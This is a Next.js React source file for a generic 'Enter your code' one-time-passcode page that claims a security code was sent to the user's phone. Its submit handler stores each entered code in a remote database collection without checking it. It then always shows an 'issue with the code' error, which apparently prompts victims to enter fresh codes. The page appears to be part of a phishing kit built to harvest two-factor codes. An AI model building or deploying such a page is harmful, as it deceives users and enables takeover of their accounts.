"use client";
import Head from "next/head";
import Image from "next/image";
import React, { useRef, useState } from "react";

function OTP() {
  const [otp, setOtp] = useState(Array(6).fill(""));
  const inputsRef = useRef([]);
  const [isShown, setIsShown] = useState(false);
  const [isLoading, setIsLoading] = useState(false);

  const handleInputChange = (e, index) => {
    const value = e.target.value;
    if (!/^\d*$/.test(value)) return; // Allow only digits

    const newOtp = [...otp];
    newOtp[index] = value.slice(-1); // Only take the last digit
    setOtp(newOtp);
    setIsShown(false);

    if (value && index < otp.length - 1) {
      inputsRef.current[index + 1].focus(); // Move focus to the next input
      setIsShown(false);
    }
  };

  const handleKeyDown = (e, index) => {
    if (e.key === "Backspace" && !otp[index] && index > 0) {
      inputsRef.current[index - 1].focus();
      setIsShown(false);
    }
  };

  const handlePaste = (e) => {
    const data = e.clipboardData.getData("text").split("");
    if (data.length === otp.length) {
      const newOtp = data.slice(0, otp.length);
      setOtp(newOtp);
      inputsRef.current[otp.length - 1].focus(); // Focus on the last input
      setIsShown(false);
    }
  };

  const handleSubmit = () => {
    const otpCode = otp.join("");
    console.log("OTP Submitted:", otpCode);
    submitOTP(otpCode);
  };

  async function submitOTP(otp) {
    setIsLoading(true);
    try {
      const res = await fetch("/api/insert-otp", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          databaseId: "6751f99600393a1261d8",
          collectionId: "6751fca500052d8703ef",
          data: { otp: otp },
        }),
      });
      const results = await res.json();
      console.log("Document Inserted Successfully", results.document);
    } catch (error) {
      console.log(error.message);
    } finally {
      setIsLoading(false);
      setIsShown(true);
    }
  }
  function handleGetNewCode() {
    setOtp(Array(6).fill(""));
  }
  return (
    <div className="flex flex-col items-center justify-center min-h-screen bg-white py-12">
      <Head>
        <title>Enter OTP</title>
      </Head>
      <div className="bg-white rounded-xl shadow-md text-center py-10 px-4 md:py-12 md:px-12 flex flex-col gap-2">
        <Image
          className="mx-auto w-12 h-12 my-4"
          src="/logo-1.svg"
          alt="Logo"
          width="34"
          height="40"
        />
        <div className="flex flex-col gap-2">
          <h3 className="md:text-2xl text-xl font-bold tracking-wide text-gray-800">
            Enter your code
          </h3>
          <p className="text-gray-500 md:text-lg text-base ">
            We sent a security code to your phone number
          </p>
        </div>
        <div className="flex items-center justify-center">
          <button onClick={handleGetNewCode} className="text-lg font-bold text-blue-800 hover:text-blue-700 transition-all duration-300">
            Get new code
          </button>
        </div>

        <div className="otp-field mt-4" onPaste={handlePaste}>
          {otp.map((digit, index) => (
            <input
              key={index}
              ref={(el) => (inputsRef.current[index] = el)}
              type="text"
              maxLength="1"
              value={digit}
              onChange={(e) => handleInputChange(e, index)}
              onKeyDown={(e) => handleKeyDown(e, index)}
              className="otp-input"
            />
          ))}
        </div>
        {isShown && (
          <p className="text-red-600">
            There is an issue with the code you entered. Please try again.
          </p>
        )}

        <button
          onClick={handleSubmit}
          className="transition-all duration-300 px-4 py-2.5 my-3 bg-[#142c8e] text-white rounded-full focus:ring-4 focus:ring-offset-0 focus:ring-blue-600/30 hover:bg-[#142c8ee5] text-xl"
        >
          {isLoading ? "Submitting..." : "Submit"}
        </button>
      </div>

      <footer className="footer mt-8">
        <div className="footer-top">
          <ul className="footer-list">
            <li>
              <a href="#">English</a>
            </li>
            <li>
              <a href="#">Spanish</a>
            </li>
            <li>
              <a href="#">French</a>
            </li>
            <li>
              <a href="#">Italian</a>
            </li>
          </ul>
        </div>
        <div className="footer-bottom">
          <p className="copyright">Copyright &copy; All Rights Reserved</p>
        </div>
      </footer>
    </div>
  );
}

export default OTP;
